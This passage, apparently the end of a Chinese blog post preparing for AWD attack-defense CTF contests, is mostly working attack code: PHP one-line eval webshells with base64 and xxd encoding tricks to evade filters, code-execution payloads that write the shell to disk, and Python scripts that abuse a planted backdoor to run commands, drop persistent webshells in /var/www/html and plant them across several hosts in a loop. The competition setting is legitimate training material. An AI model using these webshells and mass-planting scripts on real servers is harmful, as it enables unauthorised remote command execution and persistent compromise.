string">"&lt;?php @eval(\<span class="token variable">$_POST</span>[123]); ?>"</span> <span class="token operator">></span> webshell.php</pre></td></tr><tr><td data-num="3"></td><td><pre>$ <span class="token builtin class-name">echo</span> PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg<span class="token operator">==</span><span class="token operator">|</span>base64 -d <span class="token operator">></span> webshell.php   <span class="token comment">#base64 编码绕过</span></pre></td></tr><tr><td data-num="4"></td><td><pre>$ <span class="token builtin class-name">echo</span> 3c3f706870206576616c28245f504f53545b3132335d293b203f3e<span class="token operator">|</span>xxd -r -ps <span class="token operator">></span> webshell.php <span class="token comment">#xxd 绕过</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">2</span>.windows下写shell</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">></span>echo ^<span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span>$^_POST<span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?^<span class="token operator">></span> <span class="token operator">></span> webshell.php</pre></td></tr></table></figure><p><strong>利用代码执行写马</strong></p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>?code<span class="token operator">=</span>fputs<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">'./webshell.php.php'</span>,<span class="token string">'w'</span><span class="token punctuation">)</span>,<span class="token string">'&lt;?php @eval($_POST[123]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>?code<span class="token operator">=</span>file_put_contents<span class="token punctuation">(</span><span class="token string">'webshell.php.php'</span>, <span class="token string">'&lt;?php @eval($_POST[123]); ?> '</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>?code<span class="token operator">=</span>file_put_contents<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>f<span class="token punctuation">]</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>post: <span class="token assign-left variable">f</span><span class="token operator">=</span>webshell.php<span class="token operator">&amp;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span></pre></td></tr></table></figure><p>然后利用脚本实现</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># coding: UTF-8</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://192.168.182.130:8808"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>shell_path <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/include/shell.php"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>shell_passwd <span class="token operator">=</span> <span class="token string">"admin_ccmd"</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#利用预留后门</span></pre></td></tr><tr><td data-num="10"></td><td><pre>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>shell_passwd<span class="token punctuation">:</span> <span class="token string">'system(\'cat /f*\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shell_path<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#payload1 利用预留后门上传 shell</span></pre></td></tr><tr><td data-num="16"></td><td><pre>payload1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>shell_passwd<span class="token punctuation">:</span> <span class="token string">'system(\'echo "&lt;?php @eval(\$_POST[atkx]);?>" > /var/www/html/atkx.php\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shell_path<span class="token punctuation">,</span> payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell已上传"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#payload2 利用预留后门上传 shell，并 getflag</span></pre></td></tr><tr><td data-num="21"></td><td><pre>my_shell_path <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/atkx.php"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>my_shell_passwd <span class="token operator">=</span> <span class="token string">"atkx"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>payload2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>my_shell_passwd<span class="token punctuation">:</span> <span class="token string">'system(\'cat /f*\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>my_shell_path<span class="token punctuation">,</span> payload2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>批量后门写 shell</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>url_head<span class="token operator">=</span><span class="token string">"http://192.168.182.130"</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> url2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8801</span><span class="token punctuation">,</span><span class="token number">8805</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        url <span class="token operator">=</span>  url_head<span class="token operator">+</span><span class="token string">":&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>        shell_path <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/include/shell.php"</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        shell_passwd <span class="token operator">=</span> <span class="token string">"admin_ccmd"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>shell_path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">#payload1 利用预留后门上传 shell</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        payload1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>shell_passwd<span class="token punctuation">:</span> <span class="token string">'system(\'echo "&lt;?php @eval(\$_POST[atkx]);?>" > /var/www/html/atkx1.php\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shell_path<span class="token punctuation">,</span> payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">" shell写入成功！！！！！！！"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">#</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment"># #payload2 通过上传的 shell 来 getflag</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token comment"># my_shell_path = url + "/atkx1.php"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment"># my_shell_passwd = "atkx"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token comment"># payload2 = &#123;my_shell_passwd: 'system(\'cat /flag\');'&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token comment"># res = requests.post(my_shell_path, payload2)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment"># print(url,res.text)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr></table></figure><h1 id="总结"><a class="anchor" href="#总结">#</a> 总结</h1><p>1. 预留后门的权限维持特别重要，不要急着拿 flag，往后每一轮预留后门都会减少。</p><p>2.AWD 一般使用的是 cms，尽量多收集一些 cms 的 POC 和 EXP，以备不时之需。</p><p>3. 防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。</p><p>4. 检查后门，保证自己的网站上没有 d 盾可以扫出来的后门，检查计划任务或者可疑进程。</p><p>5. 比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-11-20 09:00:19" itemprop="dateModified" datetime="2022-11-20T09:00:19+08:00">2022-11-20</time> </span><span id="2022/11/17/study/AWD准备/" class="item leancloud_visitors" data-flag-title="AWD准备" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Putao0v0 <i class="ic i-at"><em>@</em></i>putao</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2022/11/17/study/AWD%E5%87%86%E5%A4%87/" title="AWD准备">http://example.com/2022/11/17/study/AWD准备/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/11/09/match/%E7%A5%A5%E4%BA%91%E6%9D%AF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63f1df38f144a01007b3164e.jpg" title="祥云杯"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 比赛</span><h3>祥云杯</h3></a></div><div class="item right"><a href="/2022/11/27/match/DASCTF%20NOV/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63f1df1af144a01007b2ae72.jpg" title="DASCTF NOV X联合出题人2022年度积分榜争夺赛！"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 比赛</span><h3>DASCTF NOV X联合出题人2022年度积分榜争夺赛！</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">改密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%BA%90%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">备份源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%A2%84%E7%95%99%E5%90%8E%E9%97%A8"><span class="toc-number">3.</span> <span class="toc-text">查找预留后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.</span> <span class="toc-text">端口扫描</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number"></span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">后门利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8Fshell"><span class="toc-number">4.</span> <span class="toc-text">隐藏 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84shell"><span class="toc-number">5.</span> <span class="toc-text">特殊的 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">6.</span> <span class="toc-text">不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">8.</span> <span class="toc-text">软链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E5%BC%B1%E5%AF%86%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">SSH 弱密码利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%90%85%E5%B1%8E"><span class="toc-number">10.</span> <span class="toc-text">攻击搅屎</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%AE%88%E6%80%9D%E8%B7%AF"><span class="toc-number"></span> <span class="toc-text">防守思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%9F%A5%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">基础查杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7"><span class="toc-number">2.</span> <span class="toc-text">文件监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alias%E8%B5%B7%E5%88%AB%E5%90%8D"><span class="toc-number">3.</span> <span class="toc-text">alias 起别名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">杀不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.</span> <span class="toc-text">清除反弹 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">7.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">9.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf"><span class="toc-number">11.</span> <span class="toc-text">WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%90%85%E5%B1%8E"><span class="toc-number">12.</span> <span class="toc-text">防御搅屎</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%89%B9%E9%87%8F%E8%84%9A%E6%9C%AC"><span class="toc-number"></span> <span class="toc-text">编写批量脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%88%A9%E7%94%A8%E5%90%8E%E9%97%A8getflag"><span class="toc-number">0.1.</span> <span class="toc-text">1. 利用后门 getflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%90%8E%E9%97%A8%E6%89%B9%E9%87%8Fgetflag"><span class="toc-number">0.2.</span> <span class="toc-text">2. 后门批量 getflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%88%A9%E7%94%A8%E5%90%8E%E9%97%A8%E6%89%B9%E9%87%8Fgetflag%E5%B9%B6%E6%8F%90%E4%BA%A4"><span class="toc-number">0.3.</span> <span class="toc-text">3. 利用后门批量 getflag 并提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%88%A9%E7%94%A8%E5%90%8E%E9%97%A8%E5%86%99shell"><span class="toc-number">0.4.</span> <span class="toc-text">4. 利用后门写 shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">总结</span></a></li></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/02/28/study/MYSQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/" rel="bookmark" title="MYSQL常用语句">MYSQL常用语句</a></li><li><a href="/2022/02/28/study/vue/" rel="bookmark" title="VUE">VUE</a></li><li><a href="/2022/06/17/study/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="bookmark" title="操作系统">操作系统</a></li><li><a href="/2022/08/12/study/%E6%9A%91%E6%9C%9F%E6%80%BB%E7%BB%93/" rel="bookmark" title="暑期总结">暑期总结</a></li><li><a href="/2022/09/14/study/git%20clone%20%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8A/" rel="bookmark" title="git clone 连接不上">git clone 连接不上</a></li><li class="active"><a href="/2022/11/17/study/AWD%E5%87%86%E5%A4%87/" rel="bookmark" title="AWD准备">AWD准备</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Putao0v0" data-src="/images/1.jpg"><p class="name" itemprop="name">Putao0v0</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">59</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">4</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">3</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1dGFvLWFp" title="https:&#x2F;&#x2F;github.com&#x2F;putao-ai"><i class="ic i-github"></i></span> <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20vdS8zNjEyMTE4NDMy" title="https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;3612118432"><i class="ic i-weibo"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/11/09/match/%E7%A5%A5%E4%BA%91%E6%9D%AF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/11/27/match/DASCTF%20NOV/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Putao0v0 @ Putao0v0</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">525k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">7:57</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/11/17/study/AWD准备/",favicon:{show:"(*╹▽╹*)土豪我们做朋友好不好",hide:"你是猪吗^(*￣(oo)￣)^"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->